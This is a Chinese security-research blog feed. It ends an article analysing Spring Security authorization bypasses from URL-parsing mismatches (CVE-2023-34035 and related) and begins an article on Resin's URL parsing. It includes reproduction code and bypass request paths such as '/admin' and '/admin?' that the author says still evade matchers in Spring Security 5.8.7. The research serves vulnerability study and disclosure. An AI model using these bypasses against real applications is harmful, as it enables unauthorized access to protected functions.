src="/img/from-urlparser-to-authbypass-SpringSecurity/37.png"></p><p>想到之前的RegexRequestMatcher存在换行符绕过的问题，RegexPathElement是否存在呢，查看最新版代码发现增加了Pattern.DOTALL，换行符无法利用了</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/38.png"></p><p>修复：在新版本的HandlerMappingIntrospector#getMatchableHandlerMapping中将返回的PathSettingHandlerMapping替换为LookupPathMatchableHandlerMapping，这两个的区别是后者的match方法对于正则pattern不是&#x2F;开头的 都在开头添加&#x2F;，解决了**匹配不到路由的问题</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/39.png"></p><p>HandlerMappingIntrospector.LookupPathMatchableHandlerMapping#match</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/40.png"></p><p>仔细观察修复方案是在HandlerMappingIntrospector中修复的，那么spring security与其他框架结合时的匹配是不是也可能存在问题？tkswifty师傅排查到了spring security与webflux结合的时候也存在类似于CVE-2023-20860的问题：CVE-2023-34034，复现详情见：<a href="https://forum.butian.net/share/2373">https://forum.butian.net/share/2373</a></p><h3 id="2-8-requestMatchers-绕过-CVE-2023-34035"><a href="#2-8-requestMatchers-绕过-CVE-2023-34035" class="headerlink" title="2.8  requestMatchers 绕过 CVE-2023-34035"></a>2.8  requestMatchers 绕过 CVE-2023-34035</h3><p>除了spring mvc、spring webflux，还有可能集成自写的servlet，spring security与自写servlet的解析也存在着解析差异，官方分配漏洞编号：CVE-2023-34035</p><p>发现者是在测试 GraphQL 项目与 Spring Security集成时， Spring Security得鉴权不生效 从而报告给了官方。官方判定是由于 GraphQL 依赖项将一个额外的 servlet 注册到 servlet 上下文中 。导致与 <strong>requestMatchers(String)</strong> 匹配规则冲突导致的鉴权失效问题，发现者记录原文：<a href="https://deepkondah.medium.com/how-i-discovered-cve-2023-34035-improper-authorization-f597812f2fac">https://deepkondah.medium.com/how-i-discovered-cve-2023-34035-improper-authorization-f597812f2fac</a></p><p>漏洞复现：总体项目代码有三个类：鉴权类、Controller控制器类、自写的Servlet类，另外还需要在springboot启动类添加@ServletComponentScan注解，具体代码如下</p><p>鉴权SecurityConfigHigh类代码</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> com.example.springsecurity.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.security.config.<span class="hljs-keyword">annotation</span>.web.builders.HttpSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.config.<span class="hljs-keyword">annotation</span>.web.configuration.EnableWebSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.web.SecurityFilterChain;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSecurity</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfigHigh</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception &#123;<br>        http.authorizeHttpRequests().requestMatchers(<span class="hljs-string">&quot;/admin/**&quot;</span>).hasRole(<span class="hljs-string">&quot;ADMIN&quot;</span>).requestMatchers(<span class="hljs-string">&quot;/manage/**&quot;</span>).hasRole(<span class="hljs-string">&quot;MANAGE&quot;</span>).anyRequest().permitAll();<br>        <span class="hljs-keyword">return</span> http.build();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Controller控制器类代码</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> com.example.springsecurity.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.GetMapping;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ManageController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/manage/page&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> String Manage()&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;manage&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>自写的Servlet类代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springsecurity.servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(urlPatterns = &quot;/admin/*&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span><br>            <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.getWriter().write(<span class="hljs-string">&quot;user page&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span><br>            <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.doGet(req, resp);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>鉴权配置含义是对除<code>/manage/**</code>、<code>/admin/**</code>外的路由放行，对<code>/admin/**</code>进行ADMIN角色权限判断，对<code>/manage/**</code>进行MANAGE角色权限判断。但是由于 Spring Security 的<code>requestMatchers(&quot;/admin/**&quot;)</code>规则不能正常匹配用户自写的Servlet url导致的鉴权功能失效</p><p>访问&#x2F;manage&#x2F;page，返回403无权限，鉴权功能正常</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/41.png"></p><p>访问&#x2F;admin&#x2F;page，可以看到成功请求到UserServlet#doGet方法并返回方法执行结果，鉴权功能失效</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/42.png"></p><p>修复：使用AntPathRequestMatcher是安全的，而使用MvcRequestMatcher存在匹配不到的问题。所以spring security改变了AbstractRequestMatcherRegistry创建RequestMatcher实例的逻辑</p><p>总体来说是：5.8.4及之前的spring security在存在spring controller的情况下就会直接创建MvcRequestMatcher，而新版本并未对MvcRequestMatcher代码做改变，而是改变了创建MvcRequestMatcher的条件：1、存在spring controller；2、context继承WebApplicationContext、且存在servletContext；3、存在DispatcherServlet且只有一个Servlet。只有满足了这几个条件，才会调用createMvcMatchers创建MvcRequestMatcher</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/43.png"></p><p>这样一来，我们上面复现的例子存在除DispatcherServlet另外的Servlet，所以创建的是AntPathRequestMatcher，修复了鉴权绕过的问题。但其实如果系统显式指定自写Servlet使用MvcRequestMatcher，依旧会存在匹配不到导致鉴权绕过的问题。但是官方也针对这个情况做了处理，如下图是手动指定MvcRequestMatcher匹配自写Servlet时，spring项目启动报错提示</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">http.authorize<span class="hljs-constructor">HttpRequests()</span>.request<span class="hljs-constructor">Matchers(String.<span class="hljs-params">valueOf</span>(<span class="hljs-params">new</span> MvcRequestMatcher.Builder(<span class="hljs-params">new</span> HandlerMappingIntrospector()</span>).servlet<span class="hljs-constructor">Path(<span class="hljs-string">&quot;/admin/**&quot;</span>)</span>)).has<span class="hljs-constructor">Role(<span class="hljs-string">&quot;MANAGE&quot;</span>)</span>.any<span class="hljs-constructor">Request()</span>.permit<span class="hljs-constructor">All()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/44.png"></p><p>尝试利用<code>寻找能注册servlet，但是spring无法完全统计识别servlet数量</code>的思路，绕过如上的检测。但是测试了4种注册servlet的方式，spring security均能检测到，都无法强制使用MvcRequestMatcher进行强制匹配</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>、WebServlet注解方式<br><span class="hljs-number">2</span>、spring提供的servlet注册接口ServletRegistrationBean<span class="hljs-meta">#setServlet方式</span><br><span class="hljs-number">3</span>、servletContext<span class="hljs-meta">#addServlet添加的方式</span><br><span class="hljs-number">4</span>、将Serlvet当做普通的bean注册给Spring的方式(需要注册多个servlet)<br></code></pre></td></tr></table></figure><p>最后一种注册的方式比较奇特，开发者不需要指定路由，路由url是servlet的名字前缀，且末尾需要添加&#x2F;才能正常访问。所以在使用ant进行匹配时，单纯匹配&#x2F;admin是无效的，需要匹配&#x2F;admin&#x2F;</p><h2 id="3、挖掘鉴权绕过场景"><a href="#3、挖掘鉴权绕过场景" class="headerlink" title="3、挖掘鉴权绕过场景"></a>3、挖掘鉴权绕过场景</h2><p>根据我们上面漏洞分析的经验来看，想要挖掘一个新的绕过场景，可以从两方面进行发力：1、找各种后端解析的pattern，挖掘ant、regex、mvc等解析器与后端对同一个pattern理解不一致的情况；2、基于历史漏洞找，找同一个利用方式在不同框架的应用，例如CVE-2023-34034与CVE-2023-20860的关系</p><p>对于第一种方式，我注意到了在servlet中<code>/admin/*</code>的pattern，可以匹配&#x2F;admin，但是在spring security理解中是无法匹配&#x2F;admin，可能会存在潜在的安全绕过</p><p>在CVE-2023-34035的修复方案中，官方建议后端是spring mvc endpoints 只能使用MvcRequestMatcher ，其他的endpoints都使用AntPathRequestMatcher，所以我在尝试将AntPathRequestMatcher与自写的servlet结合时，发现了这个问题</p><p>自写的servlet 有三种匹配模式：1精确匹配 &#x2F;admin&#x2F;index；2路径匹配 &#x2F;admin&#x2F;*；3后缀匹配 *.do 精确匹配已经被分配了CVE-2023-34035，后面两种匹配模式都存在绕过的场景</p><p>漏洞复现，使用spring security V5.8系列的最新版5.8.7</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-comment">//SecurityConfigHigh.java</span><br><span class="hljs-keyword">package</span> com.example.springsecurity.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.web.SecurityFilterChain;<br><span class="hljs-keyword">import</span> org.springframework.security.web.servlet.util.matcher.MvcRequestMatcher;<br><span class="hljs-keyword">import</span> org.springframework.security.web.util.matcher.AntPathRequestMatcher;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.<span class="hljs-keyword">handler</span>.HandlerMappingIntrospector;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSecurity</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityConfigHigh</span> </span>&#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function">SecurityFilterChain <span class="hljs-title">securityFilterChain</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        http.authorizeHttpRequests().requestMatchers(<span class="hljs-keyword">new</span> AntPathRequestMatcher(<span class="hljs-string">&quot;/admin/*&quot;</span>)).hasRole(<span class="hljs-string">&quot;MANAGE&quot;</span>).anyRequest().permitAll();;<br>        <span class="hljs-function"><span class="hljs-keyword">return</span> http.<span class="hljs-title">build</span><span class="hljs-params">()</span></span>;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-comment">//HelloController.java</span><br><span class="hljs-keyword">package</span> com.example.springsecurity.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloController</span> </span>&#123;<br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/hello/test2&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function">String <span class="hljs-title">test2</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test2 page&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-comment">//UserServlet.java</span><br><span class="hljs-keyword">package</span> com.example.springsecurity.servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet</span>(urlPatterns = <span class="hljs-string">&quot;/admin/*&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1</span>L;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        resp.getWriter().write(<span class="hljs-string">&quot;user page&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.doGet(req, resp);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>当访问&#x2F;admin&#x2F;mawkdemawk路径时，spring security起了作用，返回403无权限</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/45.png"></p><p>而当访问&#x2F;admin时，spring security的AntPathRequestMatcher对匹配&#x2F;admin失效，但servlet依然能够请求到UserServlet#doGet方法</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/46.png"></p><p>另外一个问题就是上文提到的RegexRequestMatcher关于？处理的问题</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/47.png"></p><p>这个问题在最新版依然存在</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/admin 会鉴权导致无法访问  但是可以通过/admin? 进行绕过<br>.request<span class="hljs-constructor">Matchers(<span class="hljs-params">new</span> RegexRequestMatcher(<span class="hljs-string">&quot;/admin&quot;</span>,<span class="hljs-string">&quot;GET&quot;</span>)</span>).has<span class="hljs-constructor">Role(<span class="hljs-string">&quot;MANAGE&quot;</span>)</span>.any<span class="hljs-constructor">Request()</span>.permit<span class="hljs-constructor">All()</span>;<br>.request<span class="hljs-constructor">Matchers(<span class="hljs-params">new</span> RegexRequestMatcher(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;GET&quot;</span>)</span>).has<span class="hljs-constructor">Role(<span class="hljs-string">&quot;MANAGE&quot;</span>)</span>.any<span class="hljs-constructor">Request()</span>.permit<span class="hljs-constructor">All()</span>;<br>.request<span class="hljs-constructor">Matchers(<span class="hljs-params">new</span> RegexRequestMatcher(<span class="hljs-string">&quot;/admin/*&quot;</span>,<span class="hljs-string">&quot;GET&quot;</span>)</span>).has<span class="hljs-constructor">Role(<span class="hljs-string">&quot;MANAGE&quot;</span>)</span>.any<span class="hljs-constructor">Request()</span>.permit<span class="hljs-constructor">All()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/48.png"></p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/49.png"></p><p>希望对正在研究此类问题的师傅有帮助~</p>]]></content>
    
    
    <categories>
      
      <category>体系化总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
      <tag>Bypass</tag>
      
      <tag>URL-Parser</tag>
      
      <tag>权限校验</tag>
      
      <tag>SpringSecurity</tag>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URL解析导致的鉴权绕过问题探究-Resin篇</title>
    <link href="/2023/from-urlparser-to-authbypass-resin/"/>
    <url>/2023/from-urlparser-to-authbypass-resin/</url>
    
    <content type="html"><![CDATA[<h2 id="1、起源"><a href="#1、起源" class="headerlink" title="1、起源"></a>1、起源</h2><p>在WEB侧的漏洞挖掘过程当中，如果想要完成系统的破解，往往需要重点分析鉴权相关的功能代码。因为一旦绕过了框架&#x2F;系统的权限校验，攻击者所能操作的功能、可扩展的攻击面会扩大很多。</p><p>在一个系统中，用户管理、系统设置、数据库操作等路由均需要经过权限校验，但是像登录&#x2F;登出功能、密码修改、静态文件等路由默认都是放行的。系统对于哪些功能是需要权限才能访问的判断基本就是基于URL解析完成的，即根据用户传入的URL决定是否放行&#x2F;校验该操作。而在URL解析过程中，会涉及到URL解码、.&#x2F; ..&#x2F; &#x2F;&#x2F;等路径归一化、路径参数处理以及特殊字符处理等操作。这些对于URL的操作解析会”兼容”一些攻击者构造的特殊路径导致鉴权绕过。</p><p>Orange前辈在17年&#x2F;18年的 BlackHat大会中分享了他对于URL解析问题的研究成果。17年的议题主要分析了各大语言对于URL域名部分的解析情况，引出了多个SSRF的Bypass手法。而在18年的议题中主要分析了各大框架对于URL路径部分的解析情况，引出多个权限Bypass绕过的手法。此后的5年，此类URL解析造成的鉴权绕过问题非常之多。所以近期准备对这部分的知识做个梳理。如果对文章有疑问&#x2F;建议或者想一起研究交流的师傅，欢迎私信~</p><p>本次先分析下Resin这款java web中间件，与笔者上篇文章中提到的Hessian RPC协议同属于Caucho公司，Resin的使用量极广，在fofa引擎看到近一年内有近6W个独立IP部署。这仅是开放在公网且fofa可识别的数据量，真实数据量远不止</p><p><img src="/img/from-urlparser-to-authbypass-resin/1.png"></p><p>产品链接：<a href="https://caucho.com/products/resin">https://caucho.com/products/resin</a></p><p>本文的URL解析及绕过部分使用4.0.58版本，下载源码后使用如下方式打开调试，然后双击resin.exe 开启服务</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\resin-4.0.58\conf\resin.properties 删除注释符，加入调试端口<br>jvm_args  : -Xdebug -Xrunjdwp:<span class="hljs-attribute">transport</span>=dt_socket,address=5006,server=y,suspend=n -Xmx1000m -XX:<span class="hljs-attribute">MaxPermSize</span>=256m<br>jvm_mode    : -server<br></code></pre></td></tr></table></figure><h2 id="2、Resin-解析"><a href="#2、Resin-解析" class="headerlink" title="2、Resin 解析"></a>2、Resin 解析</h2><p>Resin对于URL路径的解析部分从HttpRequest#handleRequest开始，中间涉及到splitQueryAndUnescape解码、normalizeUri路径归一化、stripPathParameters参数处理、UrlMap#map正则匹配路由等操作，如下是详细的分析</p><p>com.caucho.server.http.HttpRequest#handleRequest总体解析流程分为4步（下图已标注）：</p><p>1、HttpRequest#startRequest会获取用户传入的<code>_uri</code>、<code>_headerKeys</code>、<code>_headerValues</code>等属性并赋值；</p><p>2、第2步中的HttpRequest#parseRequest会调用readRequest ，从字节流中得到<code>method</code>、<code>uri</code>、<code>http协议版本</code>、<code>header请求头字段、值</code>。值得注意的是解析HTTP报头及header头时会自动忽略空格，在请求时可加入空格，说不定可绕些WAF？</p><p>3、第3步的AbstractHttpRequest#getInvocation是URL解析的关键，会先从缓存invocationCache中查找获取Invocation，缓存键为host、port、uri三元组。如果没获取到则调用buildInvocation方法新创建一个并加入到缓存中。buildInvocation方法会依次解析参数、url&#x2F;unicode解码、;jsessionid&#x3D;参数、<code>../</code>路由等，最后在ServletMapper#mapServlet中处理<code>;key=value/</code>参数后根据正则匹配映射对应的Servlet；</p><p>4、第4步的ServletInvocation#service中开始调用_filterChain#doFilter 进行业务系统的权限判断</p><p><img src="/img/from-urlparser-to-authbypass-resin/2.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/3.png"></p><p>重点的解析是第三步，着重分析下resin是如何处理url的，逻辑代码在com.caucho.server.http.AbstractHttpRequest#buildInvocation中。总体看是调用splitQueryAndUnescape解析拆分url&#x2F;unicode解码、InvocationServer#buildInvocation 正则匹配servlet</p><p><img src="/img/from-urlparser-to-authbypass-resin/4.png"></p><p>先看InvocationDecoder#splitQueryAndUnescape中有4步：</p><p>1、第1步根据?位置，将?后面得内容设置为_queryString参数，然后将?前面内容设置为RawURI，接着对RawURI即路径进行解码操作；</p><p>2、第2步的InvocationDecoder#normalizeUriEscape中判断如果碰见%u，需要unicode解码后返回(h &#x3D;&gt; %u0068)，如果是%，正常url解码后返回(h &#x3D;&gt; %68)；</p><p>3、第3步的会判断路径是否存在 <code>;jsessionid=</code>，如果存在就将值赋给sessionId，并删除整个字符串后赋值给RawURI继续解析；</p><p>4、第4步调用InvocationDecoder#normalizeUri根据当前操作系统的不同处理<code>../ .. ./</code>路径归一化的问题。将处理完毕的url赋值给<code>_uri</code>、<code>_contextUri</code>、<code>_servletPath</code></p><p><img src="/img/from-urlparser-to-authbypass-resin/5.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/6.png"></p><p>接着看InvocationServer#buildInvocation一路调用到WebApp#buildInvocation方法，在这个方法中有2步比较关键：</p><p>1、调用ServletMapper#mapServlet正则匹配servlet，返回FilterChain</p><p>2、调用WebApp#buildSecurity处理FilterChain，当发现<code>_contextUri</code>为&#x2F;web-inf、&#x2F;meta-inf开头时，添加404 ErrorFilterChain，这样后续处理就不会进入resin-file这个servlet</p><p><img src="/img/from-urlparser-to-authbypass-resin/7.png"></p><p>在第一步的ServletMapper#mapServlet方法下先处理路径参数，再根据正则匹配servlet，如果没匹配到会根据url路径特征指定servlet，最终返回后续调用的FilterChain：</p><p>1、首先调用了ServletInvocation#stripPathParameters去除路径中可能存在的路径参数，返回干净的url。具体做法是如果遇到分号; 则表示后面的是路径参数，如果遇到斜线&#x2F;，则表示上一个路径参数已经解析完毕。如果遇到其它字符则将其添加到StringBuilder对象中，最终返回解析后的结果StringBuilder或原始字符串（未匹配到路径参数的情况），另外如果;前面的字符是&#x2F; 那么会报错<code>is an invalid URL</code>；</p><p>2、接着调用UrlMap#map 正则匹配url对应的servlet，具体实现方式是：遍历所有正则表达式，使用正则表达式对 URI 进行匹配，找到最佳匹配项，并将匹配结果存储到 best 变量并返回（从_servletMap中正则匹配寻找。正则得末尾有$、\z， $ 表示精确匹配、\z表示后缀匹配。在正则中，\z表示字符串末尾，$表示行尾。所以\z可以匹配到换行符而$不能）；</p><p>3、如果在正则中没匹配到，那么进入特征匹配模式，即根据url的路径特征匹配 servlet：如果请求的contextURI是文件，那么指定默认的servlet（使用ServletContextImpl#getResourceAsStream 找文件，如果能找到 那么指定为resin-file）：resin-file；</p><p>4、如果contextURI以j_security_check结尾，那么指定servlet为j_security_check；</p><p>5、如果上面都没有找到，那么指定默认的servlet：resin-file；</p><p><img src="/img/from-urlparser-to-authbypass-resin/8.png"></p><p>最后根据前面各种逻辑判断获取到得servletName，在resin默认注册得<code>_servletManager</code>中找到ServletConfigImpl实例，接着创建FilterChain实例并返回</p><p><img src="/img/from-urlparser-to-authbypass-resin/9.png"></p><p>默认注册的resin servlet有：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">j_security_check    com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.FormLoginServlet</span><br>resin-xtp           com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.jsp</span><span class="hljs-selector-class">.XtpServlet</span><br>resin-jsp           com<span 